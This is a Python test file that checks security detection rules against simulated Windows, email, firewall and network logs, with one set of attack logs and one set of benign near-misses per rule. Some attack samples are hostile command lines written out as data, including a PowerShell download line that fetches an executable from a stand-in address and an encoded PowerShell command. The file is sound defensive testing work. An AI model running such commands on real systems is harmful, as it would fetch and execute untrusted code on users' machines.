"""Every detection rule gets two tests.

One set of logs must fire the rule: if it stays quiet, that is a false
negative (a missed attack). The other set is harmless activity that looks
similar and must not fire it: if it does, that is a false positive.
"""

from datetime import datetime, timedelta, timezone

import pytest

from backend.engine import detection
from backend.models import Log
from backend.simulator import events

RULES = {rule.name: rule for rule in detection.load_rules()}

T = datetime(2026, 11, 25, 12, 0, tzinfo=timezone.utc)
STAFF_IP = "10.0.20.13"
PUBLIC_IP = "203.0.113.77"
CMD = r"C:\Windows\System32\cmd.exe"
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
FTP = r"C:\Windows\System32\ftp.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
ACCOUNT_SID = "S-1-5-21-1004336348-1177238915-682003330-1009"


def failed_logons(count: int, seconds_apart: int, user: str = "s.ahmed") -> list[Log]:
    return [
        events.logon_failure(T + timedelta(seconds=i * seconds_apart), "SRV-RDP-01", user, PUBLIC_IP,
                             events.LOGON_REMOTE_DESKTOP, "test")
        for i in range(count)
    ]


def rdp_logon(ip: str) -> Log:
    return events.logon_success(T, "SRV-RDP-01", "s.ahmed", ip, events.LOGON_REMOTE_DESKTOP, "test")


def email(sender: str, attachment: str | None) -> Log:
    return events.email_delivered(T, "l.moreau", sender, "Invoice", attachment, "test")


def quarantined(log: Log) -> Log:
    log.fields = {**log.fields, "action": "quarantined"}
    return log


def process(image: str, parent: str, command_line: str | None = None) -> Log:
    return events.process_create(T, "WKS-FIN-03", "a.khan", image, parent, "test", command_line)


def script(text: str) -> Log:
    return events.script_block(T, "WKS-IT-01", "s.ahmed", text, "test")


def upload(destination_ip: str, bytes_sent: int) -> Log:
    return events.firewall_session(T, "WKS-FIN-03", "a.khan", STAFF_IP, destination_ip, 443, bytes_sent, 20_000, "test")


def connection(image: str, destination_ip: str, port: int) -> Log:
    return events.network_connection(T, "WKS-FIN-03", "a.khan", image, STAFF_IP, destination_ip, port, "test")


# rule name -> (logs that must raise exactly one alert,
#               harmless near-misses that must raise none)
CASES: dict[str, tuple[list[Log], list[Log]]] = {
    "win_security_many_failed_logons": (
        failed_logons(20, seconds_apart=5),
        # One short of the threshold, and plenty of failures but spread over
        # 50 minutes: never 20 inside any 5.
        failed_logons(19, seconds_apart=5) + failed_logons(25, seconds_apart=120, user="m.rossi"),
    ),
    "win_security_rdp_logon_from_public_ip": (
        [rdp_logon(PUBLIC_IP)],
        # Remote Desktop from each private range and from the server itself,
        # and a member of staff signing in to webmail from home: a public
        # address, but logon type 8 is not Remote Desktop.
        [
            rdp_logon("10.0.40.11"),
            rdp_logon("172.20.5.9"),
            rdp_logon("192.168.1.20"),
            rdp_logon("127.0.0.1"),
            events.logon_success(T, "SRV-MAIL-01", "a.khan", "203.0.113.50", 8, "test"),
        ],
    ),
    "email_macro_attachment_external_sender": (
        [email("accounts@c0rp.example", "Invoice_INV-20418.docm")],
        # A colleague's macro spreadsheet, an outside PDF, an email with no
        # attachment, and a macro file the gateway stopped.
        [
            email("finance-team@corp.example", "Budget_FY27.xlsm"),
            email("billing@supplier.example", "Statement_October.pdf"),
            email("newsletter@logistics-weekly.example", None),
            quarantined(email("accounts@c0rp.example", "Invoice_INV-20418.docm")),
        ],
    ),
    "proc_creation_win_office_spawns_shell": (
        [process(CMD, parent=events.WINWORD)],
        # A person opening a command prompt, and Outlook opening Word.
        [process(CMD, parent=events.EXPLORER), process(events.WINWORD, parent=events.OUTLOOK)],
    ),
    "proc_creation_win_powershell_encoded_command": (
        [process(POWERSHELL, events.EXPLORER, "powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUA")],
        # PowerShell running a script file, and a different program that
        # happens to take a -e option.
        [
            process(POWERSHELL, events.EXPLORER, r"powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Inventory.ps1"),
            process(r"C:\Program Files\Git\usr\bin\grep.exe", CMD, "grep.exe -e error app.log"),
        ],
    ),
    "posh_ps_web_download": (
        [script("(New-Object Net.WebClient).DownloadFile('http://198.51.100.23/a.exe', 'C:\\Users\\Public\\a.exe')")],
        [script("Get-Service | Where-Object Status -eq 'Stopped'")],
    ),
    "win_security_local_account_created": (
        [events.account_created(T, "WKS-HR-02", "d.okafor", "svc_update", ACCOUNT_SID, "test")],
        # IT creating a new starter's company account on the domain controller.
        [events.account_created(T, "DC-01", "s.ahmed", "n.patel", ACCOUNT_SID, "test")],
    ),
    "win_security_user_added_to_local_admins": (
        [events.group_member_added(T, "WKS-HR-02", "d.okafor", ACCOUNT_SID, "Administrators", "S-1-5-32-544", "test")],
        # Added to a group with far less power.
        [events.group_member_added(T, "WKS-HR-02", "s.ahmed", ACCOUNT_SID, "Remote Desktop Users", "S-1-5-32-555", "test")],
    ),
    "fw_large_upload_to_public_ip": (
        [upload("198.51.100.23", 2_147_483_648)],
        # A 300 MB upload, and 5 GB backups to servers in each private range.
        [
            upload("192.0.2.80", 300_000_000),
            upload("10.0.1.50", 5_000_000_000),
            upload("172.20.1.50", 5_000_000_000),
            upload("192.168.1.50", 5_000_000_000),
        ],
    ),
    "net_connection_win_ftp_to_public_ip": (
        [connection(FTP, "198.51.100.23", 21)],
        # FTP to file servers in each private range, and ordinary web browsing.
        [
            connection(FTP, "10.0.1.20", 21),
            connection(FTP, "172.20.1.20", 21),
            connection(FTP, "192.168.1.20", 21),
            connection(CHROME, "192.0.2.80", 443),
        ],
    ),
}


def test_every_rule_file_has_both_cases():
    # Adding a rule file without adding its two test cases fails here.
    assert set(CASES) == set(RULES)


@pytest.mark.parametrize("name", CASES)
def test_rule_fires_on_the_attack(name):
    attack_logs, _ = CASES[name]
    alerts = detection.detect(attack_logs, [RULES[name]])
    assert [alert.rule_id for alert in alerts] == [name]


@pytest.mark.parametrize("name", CASES)
def test_rule_stays_quiet_on_normal_activity(name):
    _, normal_logs = CASES[name]
    assert detection.detect(normal_logs, [RULES[name]]) == []


@pytest.mark.parametrize("name", CASES)
def test_every_near_miss_is_read_by_the_rule(name):
    # A near-miss only proves something if the rule actually looks at that
    # kind of log. A log from the wrong source would be "quiet" for free.
    _, normal_logs = CASES[name]
    rule = RULES[name]
    assert all(log.source == rule.source for log in normal_logs)
